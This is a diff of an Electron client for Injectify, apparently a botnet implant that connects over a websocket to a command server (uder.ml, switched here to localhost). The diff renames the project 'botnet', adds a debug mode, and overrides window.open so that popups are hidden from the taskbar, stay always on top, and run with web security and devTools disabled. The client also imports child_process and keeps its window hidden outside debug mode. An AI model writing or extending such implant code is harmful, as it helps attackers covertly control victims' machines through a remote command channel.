@@ -10,9 +10,10 @@
 /**
  * Configuration
  */
- let config = {
-    websocket: 'wss://uder.ml/i/websocket', // 'ws://127.0.0.1:3000/i/websocket'
-    project: 'private', // Injectify project name
+let config = {
+    websocket: 'ws://127.0.0.1:3000/i/websocket', //'wss://uder.ml/i/websocket', 
+    debug: true,
+    project: 'botnet', // Injectify project name
 }
 
 /**
@@ -20,6 +21,7 @@
  */
 const { remote } = require('electron')
 const win = remote.getCurrentWindow()
+const BrowserWindow = remote.BrowserWindow
 const alert = require('alert-node')
 const child_process = require('child_process')
 
@@ -41,6 +43,29 @@ window.focus = () => {
     if (!win.isFocused()) win.minimize()
     win.focus()
 }
+window.open = url => {
+    let popup = new BrowserWindow({
+        show: true,
+        title: '',
+        minimizable: false,
+        skipTaskbar: true,
+        alwaysOnTop: true,
+        webPreferences: {
+            devTools: false,
+            webSecurity: false,
+            allowRunningInsecureContent: true,
+            plugins: true,
+        }
+    })
+    popup.setMenu(null)
+    if (url) popup.loadURL(url)
+    return popup
+}
+
+/**
+ * If in debug mode, automatically show the window
+ */
+if (config.debug) win.show()
 
 /**
  * ASCII art
@@ -64,7 +89,7 @@ console.log(`%c
 console.log('💻 %cConnecting to server %c' + config.websocket, 'color: #1b93c3', 'color: #442fb1')
 let i = () => {
     window.ws = new WebSocket(
-        config.websocket + '?$' + Buffer.from(config.project).toString('base64')
+        `${config.websocket}?${config.debug ? '$' : ''}${Buffer.from(config.project).toString('base64')}`
     )
 
     let send = (topic, data) => {
